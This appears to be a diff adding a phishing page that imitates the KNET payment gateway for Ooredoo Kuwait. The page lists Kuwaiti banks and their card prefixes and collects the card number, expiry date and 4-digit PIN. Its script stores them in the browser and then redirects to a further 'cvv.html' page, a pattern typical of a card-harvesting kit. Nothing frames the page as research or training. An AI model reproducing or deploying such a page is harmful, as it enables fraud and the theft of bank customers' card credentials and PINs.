@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KNET Payment - Ooredoo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica', 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 20px;
+        }
+
+        .header img {
+            width: 80px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .payment-info {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .info-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .info-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .info-value {
+            color: #333;
+            font-weight: bold;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: border-color 0.3s;
+        }
+
+        select:focus, input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            margin-bottom: 0;
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            grid-column: 1 / -1;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-cancel {
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .btn-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .success-message {
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .bank-logo {
+            width: 40px;
+            height: 30px;
+            object-fit: contain;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 25px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .button-group {
+                grid-template-columns: 1fr;
+            }
+
+            .btn-submit {
+                grid-column: auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="/myooredoo/assets/images/knet.png" alt="KNET Logo">
+            <h1>KNET Payment</h1>
+            <p style="color: #999; font-size: 14px;">Secure Payment Gateway</p>
+        </div>
+
+        <div class="success-message" id="successMsg">
+            Payment details submitted successfully!
+        </div>
+
+        <div class="payment-info">
+            <div class="info-row">
+                <span class="info-label">Merchant:</span>
+                <span class="info-value">Ooredoo Kuwait</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Amount:</span>
+                <span class="info-value" id="amountDisplay">KD 5.000</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Reference:</span>
+                <span class="info-value" id="refDisplay">-</span>
+            </div>
+        </div>
+
+        <form id="knetForm" method="POST" action="/myooredoo/cvv.html">
+            <div class="form-group">
+                <label for="bankSelect">Select Your Bank *</label>
+                <select id="bankSelect" name="bank" required onchange="updateBankPrefixes()">
+                    <option value="">-- Select Bank --</option>
+                    <option value="NBK">National Bank of Kuwait (NBK)</option>
+                    <option value="CBK">Commercial Bank of Kuwait (CBK)</option>
+                    <option value="ABK">Al Ahli Bank of Kuwait (ABK)</option>
+                    <option value="Rajhi">Al Rajhi Bank (Rajhi)</option>
+                    <option value="BBK">Bank of Bahrain Kuwait (BBK)</option>
+                    <option value="Boubyan">Boubyan Bank</option>
+                    <option value="Burgan">Burgan Bank</option>
+                    <option value="KFH">Kuwait Finance House (KFH)</option>
+                    <option value="KIB">Kuwait International Bank (KIB)</option>
+                    <option value="GBK">Gulf Bank of Kuwait (GBK)</option>
+                    <option value="UNB">Union National Bank (UNB)</option>
+                    <option value="QNB">Qatar National Bank (QNB)</option>
+                    <option value="Warba">Warba Bank</option>
+                    <option value="Doha">Doha Bank</option>
+                </select>
+                <div class="error-message" id="bankError">Please select a bank</div>
+            </div>
+
+            <div class="form-group">
+                <label for="cardPrefix">Card Prefix *</label>
+                <select id="cardPrefix" name="cardPrefix" required>
+                    <option value="">-- Select Prefix --</option>
+                </select>
+                <div class="error-message" id="prefixError">Please select a card prefix</div>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">Debit Card Number *</label>
+                <input type="tel" id="cardNumber" name="cardNumber" placeholder="Enter 10-digit card number" maxlength="10" pattern="[0-9]{10}" required>
+                <div class="error-message" id="cardError">Please enter a valid 10-digit card number</div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label for="expMonth">Expiry Month *</label>
+                    <select id="expMonth" name="expMonth" required>
+                        <option value="">MM</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="expYear">Expiry Year *</label>
+                    <select id="expYear" name="expYear" required>
+                        <option value="">YYYY</option>
+                        <option value="2024">2024</option>
+                        <option value="2025">2025</option>
+                        <option value="2026">2026</option>
+                        <option value="2027">2027</option>
+                        <option value="2028">2028</option>
+                        <option value="2029">2029</option>
+                        <option value="2030">2030</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="pin">PIN (4 digits) *</label>
+                <input type="password" id="pin" name="pin" placeholder="Enter 4-digit PIN" maxlength="4" pattern="[0-9]{4}" inputmode="numeric" required>
+                <div class="error-message" id="pinError">Please enter a valid 4-digit PIN</div>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn-cancel" onclick="goBack()">Cancel</button>
+                <button type="submit" class="btn-submit">Submit Payment</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Bank prefixes mapping
+        const bankPrefixes = {
+            'NBK': ['464452', '589160'],
+            'CBK': ['521175', '516334', '532672', '537015'],
+            'ABK': ['403622', '423826', '428628'],
+            'Rajhi': ['458838'],
+            'BBK': ['418056', '588790'],
+            'Boubyan': ['404919', '450605', '426058', '431199', '470350', '490455', '490456'],
+            'Burgan': ['540759', '402978', '415254', '450238', '468564', '403583'],
+            'KFH': ['450778', '485602', '573016', '532674'],
+            'KIB': ['409054', '406464'],
+            'GBK': ['531329', '531471', '531470', '517419', '559475', '517458', '531644', '526206'],
+            'UNB': ['457778'],
+            'QNB': ['521020', '524745'],
+            'Warba': ['532749', '559459', '541350', '525528'],
+            'Doha': ['419252']
+        };
+
+        function updateBankPrefixes() {
+            const bankSelect = document.getElementById('bankSelect');
+            const prefixSelect = document.getElementById('cardPrefix');
+            const selectedBank = bankSelect.value;
+
+            prefixSelect.innerHTML = '<option value="">-- Select Prefix --</option>';
+
+            if (selectedBank && bankPrefixes[selectedBank]) {
+                bankPrefixes[selectedBank].forEach(prefix => {
+                    const option = document.createElement('option');
+                    option.value = prefix;
+                    option.textContent = prefix;
+                    prefixSelect.appendChild(option);
+                });
+            }
+        }
+
+        function goBack() {
+            window.history.back();
+        }
+
+        document.getElementById('knetForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // Validate form
+            let isValid = true;
+
+            if (!document.getElementById('bankSelect').value) {
+                document.getElementById('bankError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('bankError').style.display = 'none';
+            }
+
+            if (!document.getElementById('cardPrefix').value) {
+                document.getElementById('prefixError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('prefixError').style.display = 'none';
+            }
+
+            if (!document.getElementById('cardNumber').value || document.getElementById('cardNumber').value.length !== 10) {
+                document.getElementById('cardError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('cardError').style.display = 'none';
+            }
+
+            if (!document.getElementById('pin').value || document.getElementById('pin').value.length !== 4) {
+                document.getElementById('pinError').style.display = 'block';
+                isValid = false;
+            } else {
+                document.getElementById('pinError').style.display = 'none';
+            }
+
+            if (isValid) {
+                // Save data to localStorage for next page
+                localStorage.setItem('knetData', JSON.stringify({
+                    bank: document.getElementById('bankSelect').value,
+                    cardPrefix: document.getElementById('cardPrefix').value,
+                    cardNumber: document.getElementById('cardNumber').value,
+                    expMonth: document.getElementById('expMonth').value,
+                    expYear: document.getElementById('expYear').value,
+                    pin: document.getElementById('pin').value
+                }));
+
+                // Redirect to CVV page
+                window.location.href = '/myooredoo/cvv.html';
+            }
+        });
+
+        // Load data from localStorage if available
+        window.addEventListener('load', function() {
+            const total = localStorage.getItem('Total');
+            if (total) {
+                document.getElementById('amountDisplay').textContent = 'KD ' + parseFloat(total).toFixed(3);
+            }
+
+            const phoneNumber = localStorage.getItem('phoneNumber');
+            if (phoneNumber) {
+                document.getElementById('refDisplay').textContent = phoneNumber;
+            }
+        });
+    </script>
+</body>
+</html>
